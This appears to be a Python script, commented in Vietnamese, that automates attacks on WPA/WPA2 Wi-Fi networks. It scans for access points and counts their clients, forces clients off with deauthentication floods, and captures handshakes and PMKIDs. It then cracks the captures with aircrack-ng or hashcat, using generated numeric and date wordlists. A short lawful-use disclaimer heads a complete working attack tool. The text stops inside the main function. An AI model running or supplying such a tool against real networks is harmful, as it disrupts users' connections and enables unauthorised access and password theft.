#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPA/WPA2 Handshake + PMKID Catcher + Auto Cracker + Auto Installer
- PMKID attack: bắt handshake KHÔNG cần client (dùng hcxdumptool trên iface vật lý)
- Handshake truyền thống: deauth + airodump
- Auto cài đặt gói thiếu, auto crack với aircrack-ng hoặc hashcat
- Hiển thị số client đang kết nối với mỗi AP
- Auto-detect version hcxdumptool (v5/v6/v7)

CHỈ DÙNG TRÊN MẠNG BẠN SỞ HỮU HOẶC CÓ VĂN BẢN CHO PHÉP.
"""

import os
import sys
import time
import signal
import subprocess
import re
import shutil
from datetime import datetime, timedelta

# ─────────── Màu sắc ───────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
C = "\033[96m"; W = "\033[0m"; BOLD = "\033[1m"

BANNER = f"""{C}{BOLD}
╔═══════════════════════════════════════════════════════════════╗
║  HANDSHAKE + PMKID CATCHER + AUTO CRACK + AUTO INSTALLER     ║
║  Chỉ dùng cho kiểm thử bảo mật hợp pháp                       ║
╚═══════════════════════════════════════════════════════════════╝
{W}"""

# ─────────── Cấu hình ───────────
SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR   = os.path.join(SCRIPT_DIR, "handshakes")
WORDLIST_DIR = os.path.join(SCRIPT_DIR, "wordlists")

CAPTURE_TIMEOUT = 60
PMKID_TIMEOUT   = 90
DEAUTH_COUNT    = 5
DEAUTH_INTERVAL = 10

MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

TOOL_PACKAGE_MAP = {
    "airmon-ng":     "aircrack-ng",
    "airodump-ng":   "aircrack-ng",
    "aireplay-ng":   "aircrack-ng",
    "aircrack-ng":   "aircrack-ng",
    "hashcat":       "hashcat",
    "hcxpcapngtool": "hcxtools",
    "hcxdumptool":   "hcxdumptool",
}


# ═══════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════

def run(cmd, timeout=None, quiet=True):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        if not quiet and r.stdout:
            print(r.stdout)
        return r.stdout, r.returncode
    except subprocess.TimeoutExpired:
        return "", 124
    except Exception as e:
        return str(e), 1


def require_root():
    if os.geteuid() != 0:
        print(f"{R}[!] Cần chạy bằng root: sudo python3 {sys.argv[0]}{W}")
        sys.exit(1)


def detect_package_manager():
    for name, cmd in [("apt", "apt-get"), ("dnf", "dnf"), ("yum", "yum"),
                      ("pacman", "pacman"), ("zypper", "zypper"),
                      ("apk", "apk")]:
        if shutil.which(cmd):
            return name
    return None


def install_packages(pm, packages):
    print(f"\n{Y}[*] Đang cài đặt bằng {BOLD}{pm}{W}...{W}")
    if pm == "apt":
        run("apt-get update -qq", timeout=120)
        cmd = (f"DEBIAN_FRONTEND=noninteractive "
               f"apt-get install -y -qq {' '.join(packages)}")
    elif pm == "dnf":
        cmd = f"dnf install -y -q {' '.join(packages)}"
    elif pm == "yum":
        cmd = f"yum install -y -q {' '.join(packages)}"
    elif pm == "pacman":
        cmd = f"pacman -S --noconfirm --needed {' '.join(packages)}"
    elif pm == "zypper":
        cmd = f"zypper --non-interactive install {' '.join(packages)}"
    elif pm == "apk":
        cmd = f"apk add {' '.join(packages)}"
    else:
        print(f"{R}[!] Package manager không hỗ trợ: {pm}{W}")
        return False

    print(f"{Y}[*] Lệnh: {cmd}{W}")
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True,
                              text=True, timeout=600)
        if proc.returncode == 0:
            print(f"{G}[+] Cài đặt thành công.{W}")
            return True
        print(f"{R}[!] Lỗi cài đặt (mã {proc.returncode}):{W}")
        print(proc.stderr[-500:] if proc.stderr else "(không có stderr)")
        return False
    except subprocess.TimeoutExpired:
        print(f"{R}[!] Cài đặt quá 10 phút.{W}")
        return False
    except Exception as e:
        print(f"{R}[!] Lỗi: {e}{W}")
        return False


def ensure_dependencies():
    print(f"{Y}[*] Kiểm tra công cụ...{W}")
    missing_tools = [t for t in TOOL_PACKAGE_MAP if shutil.which(t) is None]
    if not missing_tools:
        print(f"{G}[+] Tất cả công cụ đã có sẵn.{W}")
        return True

    packages = list(dict.fromkeys(TOOL_PACKAGE_MAP[t] for t in missing_tools))
    print(f"{R}[!] Thiếu công cụ: {', '.join(missing_tools)}{W}")
    print(f"{Y}[*] Gói cần cài: {', '.join(packages)}{W}")

    pm = detect_package_manager()
    if not pm:
        print(f"{R}[!] Không phát hiện được package manager.{W}")
        print(f"{Y}[*] Vui lòng cài thủ công: {', '.join(packages)}{W}")
        return False

    print(f"{Y}[*] Package manager: {BOLD}{pm}{W}")
    if input(f"{BOLD}Tự động cài đặt? [Y/n]: {W}").strip().lower() not in ("", "y"):
        print(f"{Y}[*] Bỏ qua. Cài thủ công: {', '.join(packages)}{W}")
        return False

    if not install_packages(pm, packages):
        return False

    still_missing = [t for t in TOOL_PACKAGE_MAP if shutil.which(t) is None]
    if still_missing:
        print(f"{R}[!] Sau cài vẫn thiếu: {', '.join(still_missing)}{W}")
        return False

    print(f"{G}{BOLD}[+] Tất cả công cụ đã sẵn sàng!{W}")
    return True


def get_interfaces():
    out, _ = run("iw dev | awk '/Interface/ {print $2}'")
    return [i.strip() for i in out.strip().split("\n") if i.strip()]


# ═══════════════════════════════════════════════════════════
#  SERVICE MANAGEMENT (quan trọng cho PMKID)
# ═══════════════════════════════════════════════════════════

def stop_network_services():
    """Dừng NetworkManager + wpa_supplicant để nhả interface."""
    run("systemctl stop NetworkManager.service 2>/dev/null")
    run("systemctl stop wpa_supplicant.service 2>/dev/null")
    run("systemctl stop NetworkManager-dispatcher.service 2>/dev/null")
    run("pkill -9 wpa_supplicant 2>/dev/null")
    run("pkill -9 wpa_cli 2>/dev/null")
    time.sleep(1)


def start_network_services():
    """Khởi động lại NetworkManager sau khi xong."""
    run("systemctl start NetworkManager.service 2>/dev/null || "
        "service network-manager start 2>/dev/null")


# ═══════════════════════════════════════════════════════════
#  MONITOR MODE
# ═══════════════════════════════════════════════════════════

def start_monitor(iface):
    print(f"{Y}[*] Khởi động monitor mode trên {iface}...{W}")
    run("airmon-ng check kill")
    run(f"airmon-ng start {iface}")
    time.sleep(2)

    out, _ = run("iw dev")
    monitors = re.findall(r"Interface (\S+)\s+.*?type monitor", out, re.DOTALL)
    mon_iface = monitors[0] if monitors else (
        iface + "mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
    )
    print(f"{G}[+] Monitor: {BOLD}{mon_iface}{W}")
    return mon_iface


def stop_monitor(mon_iface, restart_nm=False):
    """Dừng monitor. Không tự restart NetworkManager (để caller kiểm soát)."""
    print(f"{Y}[*] Dừng monitor mode trên {mon_iface}...{W}")
    run(f"airmon-ng stop {mon_iface}")
    time.sleep(1)
    if restart_nm:
        start_network_services()


# ═══════════════════════════════════════════════════════════
#  SCAN
# ═══════════════════════════════════════════════════════════

def scan_networks(mon_iface, duration=20):
    print(f"{Y}[*] Quét mạng trong {duration}s...{W}")
    prefix = "scan_tmp"
    for ext in ("-01.csv", "-01.cap", "-01.kismet.csv",
                "-01.kismet.netxml", "-01.log.csv"):
        if os.path.exists(prefix + ext):
            os.remove(prefix + ext)

    run(f"timeout {duration} airodump-ng --output-format csv "
        f"-w {prefix} {mon_iface}", timeout=duration + 5)

    csv_file = f"{prefix}-01.csv"
    if not os.path.exists(csv_file):
        return []

    with open(csv_file, "r", errors="ignore") as f:
        content = f.read()

    parts = content.split("\r\n\r\n")
    ap_section     = parts[0] if parts else ""
    client_section = parts[1] if len(parts) >= 2 else ""

    aps = []
    for line in ap_section.split("\n")[2:]:
        cols = [c.strip() for c in line.split(",")]
        if len(cols) < 14 or not cols[0] or not MAC_RE.match(cols[0]):
            continue
        try:
            aps.append({
                "bssid":   cols[0], "channel": cols[3],
                "enc":     cols[5], "essid":   cols[13],
                "clients": 0,
            })
        except IndexError:
            continue

    client_count = {}
    for line in client_section.split("\n")[1:]:
        cols = [c.strip() for c in line.split(",")]
        if len(cols) < 6 or not cols[0] or not MAC_RE.match(cols[0]):
            continue
        if MAC_RE.match(cols[5]):
            client_count[cols[5]] = client_count.get(cols[5], 0) + 1

    for ap in aps:
        ap["clients"] = client_count.get(ap["bssid"], 0)
    return aps


def get_clients(mon_iface, bssid, channel, duration=15):
    print(f"{Y}[*] Quét client trong {duration}s...{W}")
    tmp = "clients_tmp"
    for ext in ("-01.csv", "-01.cap"):
        if os.path.exists(tmp + ext):
            os.remove(tmp + ext)

    run(f"timeout {duration} airodump-ng -c {channel} --bssid {bssid} "
        f"-w {tmp} --output-format csv {mon_iface}", timeout=duration + 5)

    csv_file = f"{tmp}-01.csv"
    clients = []
    if not os.path.exists(csv_file):
        return clients

    with open(csv_file, "r", errors="ignore") as f:
        content = f.read()
    parts = content.split("\r\n\r\n")
    if len(parts) < 2:
        return clients

    for line in parts[1].split("\n")[1:]:
        cols = [c.strip() for c in line.split(",")]
        if len(cols) < 6 or not cols[0] or not MAC_RE.match(cols[0]):
            continue
        clients.append({"station": cols[0]})
    return clients


# ═══════════════════════════════════════════════════════════
#  CAPTURE: HANDSHAKE TRUYỀN THỐNG (cần client)
# ═══════════════════════════════════════════════════════════

def capture_handshake(mon_iface, bssid, channel, essid):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    safe_essid = re.sub(r"[^A-Za-z0-9_\-]", "_", essid or "hidden")
    prefix = os.path.join(OUTPUT_DIR, f"{safe_essid}_{bssid.replace(':','')}")

    for ext in ("-01.cap", "-01.csv", "-01.kismet.netxml", "-01.log.csv"):
        if os.path.exists(prefix + ext):
            os.remove(prefix + ext)

    clients = get_clients(mon_iface, bssid, channel, duration=10)

    print(f"{Y}[*] Bắt đầu ghi handshake → {prefix}-01.cap{W}")
    airodump = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {prefix} {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    cap_file = f"{prefix}-01.cap"
    success = False
    start = time.time()
    last_deauth = -999

    try:
        while time.time() - start < CAPTURE_TIMEOUT:
            time.sleep(2)
            if not os.path.exists(cap_file):
                continue

            out, _ = run(f'aircrack-ng "{cap_file}" 2>&1')
            if "1 handshake" in out.lower():
                print(f"{G}{BOLD}[+] ĐÃ BẮT ĐƯỢC HANDSHAKE!{W}")
                success = True
                break

            now = int(time.time() - start)
            if now - last_deauth >= DEAUTH_INTERVAL:
                last_deauth = now
                if clients:
                    for cli in clients[:3]:
                        print(f"{Y}[*] Deauth → {cli['station']}{W}")
                        run(f"aireplay-ng --deauth {DEAUTH_COUNT} -a {bssid} "
                            f"-c {cli['station']} {mon_iface}", timeout=15)
                else:
                    print(f"{Y}[*] Deauth broadcast...{W}")
                    run(f"aireplay-ng --deauth {DEAUTH_COUNT} -a {bssid} "
                        f"{mon_iface}", timeout=15)
                clients = get_clients(mon_iface, bssid, channel, duration=8)
    finally:
        airodump.send_signal(signal.SIGINT)
        try:
            airodump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump.kill()

    if success:
        print(f"{G}[+] File: {C}{cap_file}{W}")
        return cap_file
    print(f"{R}[!] Không bắt được handshake sau {CAPTURE_TIMEOUT}s{W}")
    return cap_file if os.path.exists(cap_file) else None


# ═══════════════════════════════════════════════════════════
#  CAPTURE: PMKID (KHÔNG cần client)
#  QUAN TRỌNG: dùng interface VẬT LÝ (wlan0), KHÔNG phải wlan0mon
# ═══════════════════════════════════════════════════════════

def detect_hcxdumptool_version():
    """Trả về (major, minor) hoặc (None, None)."""
    out, _ = run("hcxdumptool -v 2>&1")
    if not out:
        out, _ = run("hcxdumptool --version 2>&1")
    m = re.search(r"(\d+)\.(\d+)", out or "")
    if m:
        return int(m.group(1)), int(m.group(2))
    return None, None


def check_driver_support(physical_iface):
    """Kiểm tra driver có hỗ trợ hcxdumptool không (v6.3+)."""
    major, minor = detect_hcxdumptool_version()
    if major is None:
        return None

    # v6.3+ có --check_driver
    if (major, minor) >= (6, 3):
        out, code = run(f"hcxdumptool -i {physical_iface} --check_driver 2>&1",
                        timeout=30)
        if code != 0 or "not compatible" in out.lower() or "error" in out.lower():
            return False
        return True
    return None  # không hỗ trợ check, không rõ


def build_hcxdumptool_cmd(physical_iface, pcapng_file, filter_file):
    """
    Build command dựa trên version:
    - v5.x           : -o FILE --enable_status=1
    - v6.0 - v6.2    : -o FILE --enable_status=1 (hoặc -w)
    - v6.3+ / v7.x   : -w FILE --rds=1
    Thêm --filterlist_ap nếu version hỗ trợ.
    """
    major, minor = detect_hcxdumptool_version()

    # Fallback nếu không detect được
    if major is None:
        print(f"{Y}[*] Không detect được version hcxdumptool, thử cú pháp mới{W}")
        major, minor = 7, 0

    # Version mới (>= 6.3): dùng -w và --rds
    if (major, minor) >= (6, 3):
        cmd = f"hcxdumptool -i {physical_iface} -w {pcapng_file} --rds=1"
        # Filter list có trong v6+
        cmd += f" --filterlist_ap={filter_file} --filtermode=2"
    else:
        # Version cũ (v5, v6.0-6.2): -o và --enable_status
        cmd = f"hcxdumptool -i {physical_iface} -o {pcapng_file}"
        cmd += " --enable_status=1"
        # --filterlist_ap có thể có từ v6.0
        if (major, minor) >= (6, 0):
            cmd += f" --filterlist_ap={filter_file} --filtermode=2"

    return cmd, (major, minor)


def capture_pmkid(physical_iface, bssid, channel, essid, timeout=PMKID_TIMEOUT):
    """
    Bắt PMKID — KHÔNG cần client.
    QUAN TRỌNG: physical_iface phải là interface VẬT LÝ (wlan0),
    KHÔNG phải wlan0mon. Interface phải ở chế độ managed (không monitor).
    """
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    safe_essid = re.sub(r"[^A-Za-z0-9_\-]", "_", essid or "hidden")
    pcapng_file = os.path.join(
        OUTPUT_DIR, f"pmkid_{safe_essid}_{bssid.replace(':','')}.pcapng"
    )

    if os.path.exists(pcapng_file):
        os.remove(pcapng_file)

    print(f"\n{Y}╔═══ PMKID ATTACK ═══╗{W}")
    print(f"{Y}[*] Interface vật lý: {BOLD}{physical_iface}{W}")
    print(f"{Y}[*] Mục tiêu: {essid or '(ẩn)'} ({bssid}) kênh {channel}{W}")
    print(f"{Y}[*] Thời gian tối đa: {timeout}s (Ctrl+C để dừng sớm){W}\n")

    # ── 1) Kiểm tra driver ──
    drv_ok = check_driver_support(physical_iface)
    if drv_ok is False:
        print(f"{R}[!] Driver card Wi-Fi có thể KHÔNG tương thích hcxdumptool.{W}")
        print(f"{Y}[*] Thử tiếp... (có thể vẫn hoạt động){W}")

    # ── 2) Chuẩn bị filter file BSSID ──
    filter_file = "/tmp/bssid_filter.txt"
    with open(filter_file, "w") as f:
        f.write(bssid.replace(":", "").upper() + "\n")

    # ── 3) Build command theo version ──
    cmd, ver = build_hcxdumptool_cmd(physical_iface, pcapng_file, filter_file)
    print(f"{Y}[*] hcxdumptool version: {ver[0]}.{ver[1]}{W}")
    print(f"{Y}[*] Lệnh: {BOLD}{cmd}{W}\n")

    # ── 4) Chạy với capture stderr ──
    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    start = time.time()
    last_size = 0
    last_check = 0
    check_interval = 15
    early_exit_code = None

    try:
        while time.time() - start < timeout:
            time.sleep(2)
            ret = proc.poll()
            if ret is not None:
                early_exit_code = ret
                break

            elapsed = int(time.time() - start)
            if os.path.exists(pcapng_file):
                size = os.path.getsize(pcapng_file)

                if elapsed - last_check >= check_interval:
                    last_check = elapsed
                    test_hc = "/tmp/test_check.hc22000"
                    if os.path.exists(test_hc):
                        os.remove(test_hc)
                    run(f'hcxpcapngtool -o {test_hc} '
                        f'--filterlist_ap={filter_file} --filtermode=2 '
                        f'"{pcapng_file}" 2>/dev/null')
                    if os.path.exists(test_hc) and os.path.getsize(test_hc) > 0:
                        print(f"\n{G}{BOLD}[+] ĐÃ BẮT ĐƯỢC DỮ LIỆU CHO TARGET! "
                              f"Dừng sớm.{W}")
                        break

                if size > last_size:
                    print(f"{G}[*] {elapsed}s — {size/1024:.1f} KB "
                          f"(đang quét...){W}")
                    last_size = size
                else:
                    print(f"{Y}[*] {elapsed}s — chờ AP phản hồi...{W}")
            else:
                print(f"{Y}[*] {elapsed}s — chưa có file...{W}")
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Dừng bởi người dùng.{W}")
    finally:
        # Dừng process
        if proc.poll() is None:
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=3)

        # Đọc stderr để hiển thị lỗi
        try:
            _, stderr = proc.communicate(timeout=5)
        except Exception:
            stderr = ""

    # ── 5) Phân tích lỗi nếu thoát sớm ──
    if early_exit_code is not None and not os.path.exists(pcapng_file):
        print(f"\n{R}{BOLD}[!] hcxdumptool thoát sớm (mã {early_exit_code}){W}")
        if stderr:
            print(f"{Y}[*] stderr:{W}")
            for line in stderr.strip().split("\n")[-10:]:
                print(f"    {line}")

        # Gợi ý nguyên nhân
        print(f"\n{Y}═══ Có thể do: ═══{W}")
        print(f"  1. Interface đang ở monitor mode → cần về managed trước")
        print(f"     (code đã tự xử lý, nếu vẫn lỗi hãy chạy thủ công:")
        print(f"      sudo airmon-ng stop {physical_iface}mon)")
        print(f"  2. Driver không hỗ trợ → chạy: "
              f"sudo hcxdumptool -i {physical_iface} --check_driver")
        print(f"  3. NetworkManager/wpa_supplicant đang chiếm iface")
        print(f"  4. hcxdumptool cần chạy lại không có --filterlist_ap")
        print(f"  5. Máy ảo VM không hỗ trợ USB passthrough tốt")
        return None

    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) == 0:
        print(f"{R}[!] Không có dữ liệu trong file capture.{W}")
        return None

    # ── 6) Convert sang hc22000 ──
    hc_file = pcapng_file.replace(".pcapng", ".hc22000")
    print(f"\n{Y}[*] Chuyển pcapng → hc22000 (lọc target)...{W}")
    run(f'hcxpcapngtool -o "{hc_file}" --filterlist_ap={filter_file} '
        f'--filtermode=2 "{pcapng_file}" 2>/dev/null')

    if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
        print(f"{Y}[*] Không có dữ liệu cho {bssid}, thử convert toàn bộ...{W}")
        run(f'hcxpcapngtool -o "{hc_file}" "{pcapng_file}" 2>/dev/null')

    if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
        with open(hc_file) as f:
            lines = [l.strip() for l in f if l.strip()]
        pmkid_count   = sum(1 for l in lines if l.startswith("WPA*01"))
        handshake_cnt = sum(1 for l in lines if l.startswith("WPA*02"))

        print(f"{G}{BOLD}[+] ĐÃ BẮT ĐƯỢC DỮ LIỆU!{W}")
        print(f"    → {pmkid_count} PMKID, {handshake_cnt} handshake")
        print(f"    → File: {C}{hc_file}{W}")
        return hc_file

    print(f"{R}[!] Không có PMKID/handshake hợp lệ trong file.{W}")
    print(f"{Y}[*] Có thể: AP không hỗ trợ PMKID, hoặc cần chạy lâu hơn.{W}")
    return None


# ═══════════════════════════════════════════════════════════
#  CONVERT: .cap → .hc22000
# ═══════════════════════════════════════════════════════════

def convert_cap_to_hc22000(cap_file, bssid=None):
    if cap_file.endswith(".hc22000"):
        return cap_file

    hc_file = cap_file.replace(".cap", ".hc22000")

    if bssid:
        filter_file = "/tmp/bssid_filter.txt"
        with open(filter_file, "w") as f:
            f.write(bssid.replace(":", "").upper() + "\n")
        run(f'hcxpcapngtool -o "{hc_file}" --filterlist_ap={filter_file} '
            f'--filtermode=2 "{cap_file}" 2>/dev/null')

    if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
        run(f'hcxpcapngtool -o "{hc_file}" "{cap_file}" 2>/dev/null')

    if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
        return hc_file
    return None


# ═══════════════════════════════════════════════════════════
#  WORDLIST GENERATION
# ═══════════════════════════════════════════════════════════

def progress(current, total, bar_length=40):
    percent = current / total
    filled = int(bar_length * percent)
    bar = "█" * filled + "-" * (bar_length - filled)
    sys.stdout.write(f"\r[{bar}] {percent * 100:6.2f}%")
    sys.stdout.flush()
    if current == total:
        print()


def read_date(prompt, default):
    default_str = default.strftime("%d%m%Y")
    while True:
        value = input(f"{prompt} (DDMMYYYY, Enter = {default_str}): ").strip()
        if value == "":
            return default
        try:
            return datetime.strptime(value, "%d%m%Y")
        except ValueError:
            print("Ngày không hợp lệ!")


def generate_date_wordlist(output_file):
    default_start = datetime(1900, 1, 1)
    default_end = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    while True:
        start_date = read_date("Start date", default_start)
        end_date   = read_date("End date",   default_end)
        if start_date > end_date:
            print("Start date phải <= End date!"); continue
        break

    total = (end_date - start_date).days + 1
    current = start_date
    update_every = max(1, total // 200)

    print(f"\n[*] Đang tạo {total:,} ngày...\n")
    with open(output_file, "w", encoding="utf-8") as f:
        for i in range(1, total + 1):
            f.write(current.strftime("%d%m%Y") + "\n")
            current += timedelta(days=1)
            if i % update_every == 0 or i == total:
                progress(i, total)
    return output_file


def generate_number_wordlist(output_file):
    print(f"\n{BOLD}═══ TẠO WORDLIST ═══{W}")
    for i in range(1, 11):
        start = f"{0:0{i}d}"
        end   = f"{10**i-1:0{i}d}"
        count = 10 ** i
        size_mb = count * (i + 1) / (1024 * 1024)
        print(f"  {i:>2}. {start} → {end}   "
              f"(~{size_mb:>8.1f} MB, {count:>15,} dòng)")
    print("  11. DDMMYYYY (ngày/tháng/năm)")

    option = input(f"\n{BOLD}Chọn (1-11): {W}").strip()
    if not option.isdigit():
        print(f"{R}[!] Lựa chọn không hợp lệ{W}"); return None
    option = int(option)

    if option == 11:
        return generate_date_wordlist(output_file)
    if not 1 <= option <= 10:
        print(f"{R}[!] Lựa chọn không hợp lệ{W}"); return None

    n = option
    max_num = 10 ** n
    print(f"\n{Y}Enter = full range, gõ gì đó = range tuỳ chỉnh{W}")
    custom = input().strip()

    if custom == "":
        start_num, end_num = 0, max_num - 1
    else:
        while True:
            start_str = input(f"Start ({0:0{n}d}): ").strip()
            end_str   = input(f"End   ({10**n-1:0{n}d}): ").strip()
            if not (start_str.isdigit() and end_str.isdigit()):
                print("Chỉ nhập số!"); continue
            if len(start_str) != n or len(end_str) != n:
                print(f"Phải đúng {n} chữ số!"); continue
            start_num, end_num = int(start_str), int(end_str)
            if start_num > end_num:
                print("Start phải <= End!"); continue
            break

    total = end_num - start_num + 1
    update_every = max(1, total // 200)
    print(f"\n[*] Đang tạo {total:,} dòng → {output_file}\n")

    fmt = f"{{:0{n}d}}\n"
    with open(output_file, "w", encoding="utf-8") as f:
        for index, number in enumerate(range(start_num, end_num + 1), 1):
            f.write(fmt.format(number))
            if index % update_every == 0 or index == total:
                progress(index, total)
    return output_file


# ═══════════════════════════════════════════════════════════
#  CRACK ENGINES
# ═══════════════════════════════════════════════════════════

def print_found(key):
    print(f"\n{G}{BOLD}╔═══════════════════════════════════════╗{W}")
    print(f"{G}{BOLD}║  🔑 PASSWORD: {key:<23}║{W}")
    print(f"{G}{BOLD}╚═══════════════════════════════════════╝{W}")


def crack_aircrack(cap_file, bssid, wordlist):
    print(f"\n{Y}[*] aircrack-ng với {wordlist}...{W}")
    try:
        proc = subprocess.run(
            f'aircrack-ng -w "{wordlist}" -b {bssid} "{cap_file}"',
            shell=True, capture_output=True, text=True
        )
        out = proc.stdout + proc.stderr
        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
        if m:
            return m.group(1).strip()
        return None
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Đã dừng crack.{W}")
        return None


def crack_hashcat_mask(hc_file, n_digits):
    found_file = hc_file + "_found.txt"
    if os.path.exists(found_file):
        os.remove(found_file)

    mask = "?d" * n_digits
    print(f"{Y}[*] hashcat mask {mask} trên {hc_file}{W}")
    print(f"{Y}[*] Ctrl+C để dừng{W}\n")
    cmd = (
        f'hashcat -m 22000 -a 3 "{hc_file}" {mask} '
        f'--potfile-disable --outfile "{found_file}" --outfile-format 2 '
        f'--status --status-timer=10'
    )
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Đã dừng hashcat.{W}")

    if os.path.exists(found_file) and os.path.getsize(found_file) > 0:
        with open(found_file) as f:
            return f.read().strip().split("\n")[0]
    return None


def crack_hashcat_wordlist(hc_file, wordlist):
    found_file = hc_file + "_found.txt"
    if os.path.exists(found_file):
        os.remove(found_file)

    print(f"{Y}[*] hashcat -a 0 với {wordlist}{W}")
    print(f"{Y}[*] Ctrl+C để dừng{W}\n")
    cmd = (
        f'hashcat -m 22000 -a 0 "{hc_file}" "{wordlist}" '
        f'--potfile-disable --outfile "{found_file}" --outfile-format 2 '
        f'--status --status-timer=10'
    )
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Đã dừng hashcat.{W}")

    if os.path.exists(found_file) and os.path.getsize(found_file) > 0:
        with open(found_file) as f:
            return f.read().strip().split("\n")[0]
    return None


# ═══════════════════════════════════════════════════════════
#  CRACK FLOWS
# ═══════════════════════════════════════════════════════════

def _make_wordlist():
    os.makedirs(WORDLIST_DIR, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    wl = os.path.join(WORDLIST_DIR, f"auto_{stamp}.txt")
    return generate_number_wordlist(wl)


def _cleanup_wordlist(wl):
    if wl and os.path.exists(wl):
        size_mb = os.path.getsize(wl) / (1024 * 1024)
        ans = input(f"\n{Y}Xoá wordlist tạm ({size_mb:.1f} MB)? [y/N]: {W}").strip().lower()
        if ans == "y":
            os.remove(wl)
            print(f"{G}[+] Đã xoá.{W}")
        else:
            print(f"{Y}[*] Giữ lại: {wl}{W}")


def flow_aircrack(cap_file, bssid):
    if cap_file.endswith(".hc22000"):
        print(f"{R}[!] File .hc22000 không crack được bằng aircrack-ng.{W}")
        print(f"{Y}[*] Dùng hashcat thay thế.{W}")
        return None
    wl = _make_wordlist()
    if not wl:
        return None
    try:
        size_mb = os.path.getsize(wl) / (1024 * 1024)
        print(f"\n{G}[+] Wordlist: {wl} ({size_mb:.1f} MB){W}")
        found = crack_aircrack(cap_file, bssid, wl)
        if found:
            print_found(found)
        else:
            print(f"\n{R}[!] Không tìm được mật khẩu.{W}")
        return found
    finally:
        _cleanup_wordlist(wl)


def flow_hashcat_mask(file_path):
    print(f"\n{BOLD}Chọn số chữ số (hashcat mask):{W}")
    for i in range(1, 11):
        print(f"  {i:>2}. {0:0{i}d} → {10**i-1:0{i}d}   "
              f"({10**i:>15,} tổ hợp)")

    try:
        n = int(input(f"\n{BOLD}Chọn (1-10): {W}").strip())
        if not 1 <= n <= 10:
            raise ValueError
    except ValueError:
        print(f"{R}[!] Lựa chọn không hợp lệ{W}")
        return None

    if n >= 9:
        print(f"{R}[!] CẢNH BÁO: {10**n:,} tổ hợp — có thể rất lâu!{W}")
        if input(f"{Y}Tiếp tục? [y/N]: {W}").strip().lower() != "y":
            return None

    hc_file = file_path if file_path.endswith(".hc22000") else \
              convert_cap_to_hc22000(file_path)
    if not hc_file:
        print(f"{R}[!] Không chuyển đổi được file.{W}")
        return None

    found = crack_hashcat_mask(hc_file, n)
    if found:
        print_found(found)
    else:
        print(f"\n{R}[!] Không tìm được mật khẩu.{W}")
    return found


def flow_hashcat_wordlist(file_path):
    wl = _make_wordlist()
    if not wl:
        return None
    try:
        hc_file = file_path if file_path.endswith(".hc22000") else \
                  convert_cap_to_hc22000(file_path)
        if not hc_file:
            print(f"{R}[!] Không chuyển đổi được file.{W}")
            return None

        found = crack_hashcat_wordlist(hc_file, wl)
        if found:
            print_found(found)
        else:
            print(f"\n{R}[!] Không tìm được mật khẩu.{W}")
        return found
    finally:
        _cleanup_wordlist(wl)


# ═══════════════════════════════════════════════════════════
#  CRACK MENU
# ═══════════════════════════════════════════════════════════

def crack_menu(file_path, bssid, essid, is_pmkid=False):
    print(f"\n{C}{BOLD}═══ DỮ LIỆU ĐÃ SẴN SÀNG ═══{W}")
    print(f"  File   : {file_path}")
    print(f"  BSSID  : {bssid}")
    print(f"  ESSID  : {essid or '(ẩn)'}")
    if is_pmkid:
        print(f"  Method : PMKID (hashcat-only)")
    print()

    print(f"{BOLD}Bạn muốn crack ngay?{W}")
    if is_pmkid:
        print(f"  1. hashcat mask                    (dãy số, nhanh nhất)")
        print(f"  2. hashcat + wordlist tự tạo       (hỗ trợ số & ngày)")
        print(f"  3. Không crack (chỉ lưu file)")
    else:
        print(f"  1. aircrack-ng + wordlist tự tạo   (hỗ trợ số & ngày)")
        print(f"  2. hashcat mask                    (dãy số, nhanh hơn)")
        print(f"  3. hashcat + wordlist tự tạo       (nếu có GPU)")
        print(f"  4. Không crack")

    max_choice = "3" if is_pmkid else "4"
    choice = input(f"\n{BOLD}Chọn (1-{max_choice}): {W}").strip()

    if is_pmkid:
        if choice == "1":
            return flow_hashcat_mask(file_path)
        if choice == "2":
            return flow_hashcat_wordlist(file_path)
        print(f"{Y}[*] Bỏ qua. File lưu tại: {file_path}{W}")
        return None
    else:
        if choice == "1":
            return flow_aircrack(file_path, bssid)
        if choice == "2":
            return flow_hashcat_mask(file_path)
        if choice == "3":
            return flow_hashcat_wordlist(file_path)
        print(f"{Y}[*] Bỏ qua. File lưu tại: {file_path}{W}")
        return None


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════

def main():
    require_root()
    print(BANNER)

    if not ensure_dependencies():
        print(f"{R}[!] Không thể tiếp tục vì thiếu công cụ.{W}")
        sys.exit(1)

    ifaces = get_interfaces()
    if not ifaces:
        print(f"{R}[!] Không có interface Wi-Fi nào.{W}")
        sys.exit(1)

